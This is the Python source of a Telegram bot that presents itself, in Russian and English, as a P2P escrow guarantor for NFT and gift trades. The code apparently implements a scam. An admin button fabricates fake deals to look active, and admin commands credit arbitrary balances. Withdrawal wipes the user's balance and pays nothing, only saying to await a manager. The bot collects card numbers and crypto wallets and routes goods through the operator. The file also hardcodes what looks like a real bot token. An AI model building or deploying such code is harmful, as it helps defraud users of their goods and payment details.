import asyncio
import logging
import os
import sys
import signal
import random
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery, URLInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = os.getenv("BOT_TOKEN", "8862273506:AAHvSY7aLzmiTr_qnSLm10JzJWKey8TSfzU")
MASTER_ID = int(os.getenv("MASTER_ID", "8297446667"))
BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/W4xFfP0j/banner.png")  # Замени на прямую ссылку

users = {}
deals = {}
deal_counter = 1000

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

WELCOME_TEXT = (
    "💼 Добро пожаловать в  🤝\n\n"
    "⚡️ Ваш надёжный P2P-гарант:\n"
    "1⃣ Автоматические сделки с NFT и подарками\n"
    "2⃣ 🛡 Полная защита обеих сторон\n"
    "3⃣ 🪙 Реферальная программа — 50% от комиссии\n"
    "4⃣ 📦 Передача товаров через менеджера\n\n"
    "💡 Выберите действие ниже ⬇️"
)

ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"

class DealStates(StatesGroup):
    waiting_role = State()
    waiting_currency = State()
    waiting_amount = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_deal_id = State()

# ---------- КЛАВИАТУРЫ ----------
def main_menu(lang="ru"):
    t = {
        "ru": {"balance": "💰 Баланс", "my_deals": "📋 Мои сделки", "new_deal": "🤝 Создать сделку",
               "my_rekv": "📄 Мои реквизиты", "referrals": "👥 Рефералы", "lang": "🌐 Язык / Language", "support": "🆘 Техподдержка"},
        "en": {"balance": "💰 Balance", "my_deals": "📋 My Deals", "new_deal": "🤝 New Deal",
               "my_rekv": "📄 My Details", "referrals": "👥 Referrals", "lang": "🌐 Language / Язык", "support": "🆘 Support"}
    }[lang]
    kb = [
        [InlineKeyboardButton(text=t["balance"], callback_data="balance_menu")],
        [InlineKeyboardButton(text=t["my_deals"], callback_data="my_deals"), InlineKeyboardButton(text=t["new_deal"], callback_data="new_deal")],
        [InlineKeyboardButton(text=t["my_rekv"], callback_data="my_rekv")],
        [InlineKeyboardButton(text=t["referrals"], callback_data="referrals")],
        [InlineKeyboardButton(text=t["lang"], callback_data="change_lang"), InlineKeyboardButton(text=t["support"], callback_data="support")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def admin_menu():
    kb = [
        [InlineKeyboardButton(text="💰 Пополнить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="✅ Завершить сделку", callback_data="admin_complete_deal")],
        [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="🔢 Создать тестовые сделки", callback_data="admin_fake_deals")],
        [InlineKeyboardButton(text="🔙 В главное меню", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def balance_menu(lang="ru"):
    t = {"ru": {"history": "📜 История транзакций", "withdraw": "💸 Вывод средств", "back": "🔙 Назад"},
         "en": {"history": "📜 Transaction History", "withdraw": "💸 Withdraw", "back": "🔙 Back"}}[lang]
    kb = [[InlineKeyboardButton(text=t["history"], callback_data="tx_history")],
          [InlineKeyboardButton(text=t["withdraw"], callback_data="withdraw_funds")],
          [InlineKeyboardButton(text=t["back"], callback_data="main_menu")]]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def rekv_menu(lang="ru"):
    labels = ["ton","card","username","stars","usdt","btc"]
    t = {"ru": ["💎 TON Кошелек", "💳 Карта", "👤 Юзернейм", "⭐ Звезды", "💵 USDT Кошелек", "₿ BTC Кошелек", "🔙 Назад"],
         "en": ["💎 TON Wallet", "💳 Card", "👤 Username", "⭐ Stars", "💵 USDT Wallet", "₿ BTC Wallet", "🔙 Back"]}[lang]
    kb = []
    for i in range(6):
        kb.append([InlineKeyboardButton(text=t[i], callback_data=f"set_{labels[i]}")])
    kb.append([InlineKeyboardButton(text=t[6], callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def deal_role_choice(lang="ru"):
    t = {"ru": ["🛒 Я продавец", "🛍 Я покупатель", "🔙 Отмена"],
         "en": ["🛒 I'm Seller", "🛍 I'm Buyer", "🔙 Cancel"]}[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t[0], callback_data="role_seller")],
        [InlineKeyboardButton(text=t[1], callback_data="role_buyer")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ])

def currency_choice(lang="ru"):
    cur = [("💎 TON", "ton"), ("💳 Карта", "card"), ("👤 Юзернейм", "username"),
           ("⭐ Звезды", "stars"), ("💵 USDT", "usdt"), ("₿ BTC", "btc")]
    kb = []
    for i in range(0, 6, 2):
        row = [InlineKeyboardButton(text=cur[i][0], callback_data=f"cur_{cur[i][1]}")]
        if i+1 < 6: row.append(InlineKeyboardButton(text=cur[i+1][0], callback_data=f"cur_{cur[i+1][1]}"))
        kb.append(row)
    kb.append([InlineKeyboardButton(text="🔙 Отмена" if lang=="ru" else "🔙 Cancel", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_button(lang="ru"):
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")]])

def get_lang(uid): return users.get(uid, {}).get("lang", "ru")

# ---------- ОТПРАВКА СООБЩЕНИЙ (удалить старое, отправить новое) ----------
async def delete_and_send(call: CallbackQuery, text: str, reply_markup=None):
    """Удаляет сообщение, из которого был callback, и отправляет новое"""
    await call.answer()
    try:
        await call.message.delete()
    except:
        pass
    await call.message.answer(text, reply_markup=reply_markup)

async def send_welcome(chat_id, lang="ru"):
    """Отправка приветствия с баннером или текстом"""
    if BANNER_URL:
        try:
            await bot.send_photo(chat_id, URLInputFile(BANNER_URL), caption=WELCOME_TEXT, reply_markup=main_menu(lang))
            return
        except Exception as e:
            logging.warning(f"Баннер не загрузился: {e}")
    await bot.send_message(chat_id, WELCOME_TEXT, reply_markup=main_menu(lang))

async def edit_to_welcome(call: CallbackQuery, lang="ru"):
    """Пытается вернуть главное меню с баннером, иначе удаляет и отправляет новое"""
    await call.answer()
    if BANNER_URL:
        try:
            await call.message.edit_media(
                types.InputMediaPhoto(media=URLInputFile(BANNER_URL), caption=WELCOME_TEXT),
                reply_markup=main_menu(lang)
            )
            return
        except:
            pass
    # Если не получилось, удаляем и отправляем новое
    try:
        await call.message.delete()
    except:
        pass
    await send_welcome(call.from_user.id, lang)

async def complete_deal_logic(deal_id, msg=None, call=None):
    d = deals[deal_id]
    sid, amt = d["seller_id"], d["amount"]
    if sid in users:
        users[sid]["balance"] += amt
        users[sid].setdefault("history", []).append(f"✅ Сделка #{deal_id}: +{amt}₽")
    d["status"] = "completed"
    txt = f"✅ Сделка #{deal_id} завершена. Продавец получил {amt}₽."
    if msg: await msg.answer(txt)
    if call: await call.message.edit_text(txt, reply_markup=admin_menu())
    try:
        await bot.send_message(sid, f"✅ Сделка #{deal_id} завершена! +{amt}₽.")
        if d["buyer_id"]: await bot.send_message(d["buyer_id"], f"✅ Сделка #{deal_id} завершена.")
    except: pass

# ---------- /start ----------
@dp.message(Command("start"))
async def cmd_start(message: Message):
    uid = message.from_user.id
    args = message.text.split()
    ref_id = None
    # Вход по ссылке сделки
    if len(args) > 1 and args[1].startswith("deal_"):
        try:
            deal_id = int(args[1].split("_")[1])
            if deal_id in deals and deals[deal_id]["status"] == "active":
                d = deals[deal_id]
                if d["seller_id"] is None:
                    d["seller_id"] = uid
                elif d["buyer_id"] is None:
                    d["buyer_id"] = uid
                else:
                    return await message.answer("❌ Сделка уже заполнена.")
                return await message.answer(
                    f"✅ Вы присоединились к сделке #{deal_id}!\nСумма: {d['amount']} {d['currency']}",
                    reply_markup=main_menu(get_lang(uid))
                )
        except:
            pass
    # Реферальная система
    if len(args) > 1:
        try: ref_id = int(args[1])
        except: pass
    if uid not in users:
        users[uid] = {
            "balance": 0.0, "ton": "", "card": "", "username": "", "stars": "", "usdt": "", "btc": "",
            "lang": "ru", "history": [], "pending_rekv": None, "referrer_id": ref_id, "referrals": []
        }
        if ref_id and ref_id != uid and ref_id in users:
            users[ref_id]["balance"] += 2.0
            users[ref_id].setdefault("history", []).append(f"🎁 Реферал: +2₽ от {uid}")
            users[ref_id].setdefault("referrals", []).append(uid)
            try: await bot.send_message(ref_id, "🎁 +2₽ за друга!")
            except: pass
    await send_welcome(message.chat.id, get_lang(uid))

# ---------- /admin ----------
@dp.message(Command("admin"))
async def admin_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    await message.answer(ADMIN_TEXT, reply_markup=admin_menu())

# ---------- /masterb ----------
@dp.message(Command("masterb"))
async def masterb_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Зачисление: +{amt}₽")
        await message.answer(f"✅ Пользователю {uid} выдано {amt}₽.")
        try: await bot.send_message(uid, f"💰 На ваш баланс зачислено {amt}₽.")
        except: pass
    except: await message.answer("❌ Формат: /masterb user_id сумма")

# ---------- /giveMas ----------
@dp.message(Command("giveMas"))
async def givemas_cmd(message: Message):
    if message.from_user.id != MASTER_ID: return await message.answer("❌ Нет доступа.")
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        if did not in deals or deals[did]["status"] != "active":
            return await message.answer("❌ Сделка не найдена.")
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Формат: /giveMas deal_id")

# ---------- ГЛАВНОЕ МЕНЮ (возврат) ----------
@dp.callback_query(F.data == "main_menu")
async def main_menu_cb(call: CallbackQuery):
    await edit_to_welcome(call, get_lang(call.from_user.id))

# ---------- АДМИН-ПАНЕЛЬ (колбэки) ----------
@dp.callback_query(F.data == "admin_panel")
async def admin_panel_cb(call: CallbackQuery):
    if call.from_user.id != MASTER_ID: return await call.answer("❌ Нет доступа.", show_alert=True)
    await delete_and_send(call, ADMIN_TEXT, admin_menu())

@dp.callback_query(F.data == "admin_add_balance")
async def adm_add_bal(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await delete_and_send(call, "Введи: user_id сумма", back_button("ru"))
    await state.set_state(AdminStates.waiting_user_id)

@dp.message(AdminStates.waiting_user_id)
async def adm_bal_proc(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ID: return
    try:
        uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(uid, {"balance":0,"history":[]})
        users[uid]["balance"] += amt
        users[uid].setdefault("history",[]).append(f"⚡ Админ: +{amt}₽")
        await message.answer(f"✅ Баланс {uid} пополнен на {amt}₽.", reply_markup=admin_menu())
    except: await message.answer("❌ Формат: user_id сумма")
    await state.clear()

@dp.callback_query(F.data == "admin_complete_deal")
async def adm_compl(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    await delete_and_send(call, "Введи ID сделки:", back_button("ru"))
    await state.set_state(AdminStates.waiting_deal_id)

@dp.message(AdminStates.waiting_deal_id)
async def adm_compl_proc(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ID: return
    try:
        did = int(message.text.strip())
        if did not in deals or deals[did]["status"]!="active":
            return await message.answer("❌ Не найдена.", reply_markup=admin_menu())
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Введи число.")
    await state.clear()

@dp.callback_query(F.data == "admin_all_deals")
async def adm_all_deals(call: CallbackQuery):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    if not deals:
        return await delete_and_send(call, "📭 Сделок нет.", admin_menu())
    txt = "📋 Все сделки:\n\n" + "\n".join(
        [f"#{did}: {d['amount']} {d['currency']} | Продавец: {d['seller_id']} | Статус: {d['status']}" for did,d in deals.items()]
    )
    await delete_and_send(call, txt, admin_menu())

@dp.callback_query(F.data == "admin_stats")
async def adm_stats(call: CallbackQuery):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    total_users = len(users)
    total_deals = len(deals)
    active_deals = sum(1 for d in deals.values() if d["status"] == "active")
    total_balance = sum(u.get("balance", 0) for u in users.values())
    txt = f"📊 Статистика:\n\n👥 Пользователей: {total_users}\n📋 Сделок: {total_deals}\n🟢 Активных: {active_deals}\n💰 Общий баланс: {total_balance}₽"
    await delete_and_send(call, txt, admin_menu())

@dp.callback_query(F.data == "admin_fake_deals")
async def adm_fake(call: CallbackQuery):
    if call.from_user.id != MASTER_ID: return await call.answer("❌", show_alert=True)
    global deal_counter
    cur_list = ["ton","card","username","stars","usdt","btc"]
    cnt = random.randint(0, 40)
    for _ in range(cnt):
        deal_counter += 1
        deals[deal_counter] = {
            "seller_id": MASTER_ID,
            "buyer_id": random.choice(list(users.keys())) if users else MASTER_ID,
            "amount": round(random.uniform(100, 10000), 2),
            "currency": random.choice(cur_list),
            "status": random.choice(["active","completed"])
        }
    await delete_and_send(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu())

# ---------- БАЛАНС ----------
@dp.callback_query(F.data == "balance_menu")
async def bal(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    bal = users.get(uid, {}).get("balance", 0)
    await delete_and_send(call, f"💰 Ваш баланс: {bal:.2f}₽", balance_menu(lang))

@dp.callback_query(F.data == "tx_history")
async def hist(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    h = users.get(uid, {}).get("history", [])
    txt = "📜 История транзакций:\n" + ("\n".join(h[-15:]) if h else "Пусто")
    await delete_and_send(call, txt, back_button(lang))

@dp.callback_query(F.data == "withdraw_funds")
async def wd(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    b = users.get(uid, {}).get("balance", 0)
    if b <= 0:
        await call.answer("❌ Недостаточно средств" if lang=="ru" else "❌ Insufficient funds", show_alert=True)
        return
    users[uid]["balance"] = 0.0
    users[uid].setdefault("history", []).append(f"💸 Вывод: -{b:.2f}₽")
    await delete_and_send(call, f"✅ Выведено {b:.2f}₽\nОжидайте менеджера.", back_button(lang))

# ---------- МОИ РЕКВИЗИТЫ ----------
@dp.callback_query(F.data == "my_rekv")
async def rekv(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    u = users.get(uid, {})
    lbl = {"ton":"💎 TON","card":"💳 Карта","username":"👤 Юзернейм","stars":"⭐ Звезды","usdt":"💵 USDT","btc":"₿ BTC"}
    txt = "\n".join([f"{v}: {u.get(k, '❌ не указан')}" for k,v in lbl.items()])
    await delete_and_send(call, txt, rekv_menu(lang))

# Обработчики для каждого реквизита
for cb, key in [("set_ton","ton"),("set_card","card"),("set_username","username"),
                ("set_stars","stars"),("set_usdt","usdt"),("set_btc","btc")]:
    @dp.callback_query(F.data == cb)
    async def ask_rekv(call: CallbackQuery, key=key):
        uid = call.from_user.id; lang = get_lang(uid)
        prompts = {
            "ton": ("Введите TON кошелёк:", "Enter TON wallet:"),
            "card": ("Введите номер карты:", "Enter card number:"),
            "username": ("Введите юзернейм:", "Enter username:"),
            "stars": ("Введите ID звёзд:", "Enter Stars ID:"),
            "usdt": ("Введите USDT кошелёк:", "Enter USDT wallet:"),
            "btc": ("Введите BTC кошелёк:", "Enter BTC wallet:")
        }
        prompt = prompts[key][0] if lang=="ru" else prompts[key][1]
        users[uid]["pending_rekv"] = key
        await delete_and_send(call, prompt, back_button(lang))

# Общий обработчик текстовых сообщений (для ввода реквизитов)
@dp.message()
async def handle_rekv_input(message: Message):
    uid = message.from_user.id
    if uid in users and users[uid].get("pending_rekv"):
        key = users[uid]["pending_rekv"]
        users[uid][key] = message.text
        users[uid]["pending_rekv"] = None
        lang = get_lang(uid)
        await message.answer("✅ Сохранено!", reply_markup=main_menu(lang))

# ---------- СДЕЛКИ ----------
@dp.callback_query(F.data == "new_deal")
async def new_deal(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await delete_and_send(call, "Выберите роль:", deal_role_choice(get_lang(call.from_user.id)))
    await state.set_state(DealStates.waiting_role)

@dp.callback_query(F.data.startswith("role_"), DealStates.waiting_role)
async def role_chosen(call: CallbackQuery, state: FSMContext):
    role = "seller" if call.data == "role_seller" else "buyer"
    await state.update_data(role=role)
    await delete_and_send(call, "Выберите валюту получения продавцом:", currency_choice(get_lang(call.from_user.id)))
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(F.data.startswith("cur_"), DealStates.waiting_currency)
async def currency_chosen(call: CallbackQuery, state: FSMContext):
    cur = call.data.replace("cur_", "")
    await state.update_data(currency=cur)
    await delete_and_send(call, "Введите сумму:", back_button(get_lang(call.from_user.id)))
    await state.set_state(DealStates.waiting_amount)

@dp.message(DealStates.waiting_amount)
async def amount_entered(message: Message, state: FSMContext):
    global deal_counter
    uid = message.from_user.id; lang = get_lang(uid)
    try:
        amt = float(message.text)
        if amt <= 0: raise ValueError
    except:
        return await message.answer("❌ Введите корректное число.")
    data = await state.get_data()
    deal_counter += 1
    role = data["role"]
    deals[deal_counter] = {
        "seller_id": uid if role == "seller" else None,
        "buyer_id": uid if role == "buyer" else None,
        "amount": amt,
        "currency": data["currency"],
        "status": "active"
    }
    link = f"https://t.me/{(await bot.me()).username}?start=deal_{deal_counter}"
    text = (
        f"✅ Сделка #{deal_counter} создана!\n\n"
        f"📋 Роль: {'Продавец' if role=='seller' else 'Покупатель'}\n"
        f"💰 Сумма: {amt} {data['currency']}\n\n"
        f"🔗 Отправьте эту ссылку второй стороне:\n{link}\n\n"
        f"Ожидайте подтверждения менеджера."
    )
    await message.answer(text, reply_markup=main_menu(lang))
    await state.clear()

@dp.callback_query(F.data == "my_deals")
async def my_deals_cb(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    user_deals = [(did, d) for did, d in deals.items() if d["seller_id"] == uid or d["buyer_id"] == uid]
    if not user_deals:
        await delete_and_send(call, "🔍 У вас нет сделок.", back_button(lang))
        return
    txt = "📋 Ваши сделки:\n\n" + "\n".join(
        [f"🔹 #{did}: {d['amount']} {d['currency']} | Статус: {d['status']}" for did, d in user_deals]
    )
    txt += "\n\n🔎 Поиск: /search код_сделки"
    await delete_and_send(call, txt, back_button(lang))

@dp.message(Command("search"))
async def search_cmd(message: Message):
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        d = deals.get(did)
        if d:
            await message.answer(f"🔍 Сделка #{did}: {d['amount']} {d['currency']} | Статус: {d['status']}")
        else:
            await message.answer("❌ Сделка не найдена.")
    except:
        await message.answer("❌ Формат: /search код_сделки")

# ---------- РЕФЕРАЛЫ ----------
@dp.callback_query(F.data == "referrals")
async def ref_cb(call: CallbackQuery):
    uid = call.from_user.id; lang = get_lang(uid)
    refs = users.get(uid, {}).get("referrals", [])
    bot_username = (await bot.me()).username
    link = f"https://t.me/{bot_username}?start={uid}"
    txt = (
        f"👥 Реферальная программа\n\n"
        f"🔗 Ваша ссылка:\n{link}\n\n"
        f"👤 Приглашено: {len(refs)} чел.\n"
        f"💰 Заработано: {len(refs) * 2}₽"
    )
    await delete_and_send(call, txt, back_button(lang))

# ---------- СМЕНА ЯЗЫКА ----------
@dp.callback_query(F.data == "change_lang")
async def lang_cb(call: CallbackQuery):
    uid = call.from_user.id
    cur_lang = users.setdefault(uid, {}).setdefault("lang", "ru")
    new_lang = "en" if cur_lang == "ru" else "ru"
    users[uid]["lang"] = new_lang
    await edit_to_welcome(call, new_lang)  # Обновит главное меню с новым языком

# ---------- ТЕХПОДДЕРЖКА ----------
@dp.callback_query(F.data == "support")
async def supp_cb(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Написать @dumufa", url="https://t.me/dumufa")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
    ])
    await delete_and_send(call, "🆘 Техподдержка\nСвяжитесь с менеджером: @dumufa", kb)

# ---------- ЗАПУСК ----------
async def main():
    logging.info("Запуск бота...")
    try:
        await bot.session.close()
    except:
        pass
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types(), polling_timeout=20, handle_as_tasks=True)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda s, f: sys.exit(0))
    asyncio.run(main())
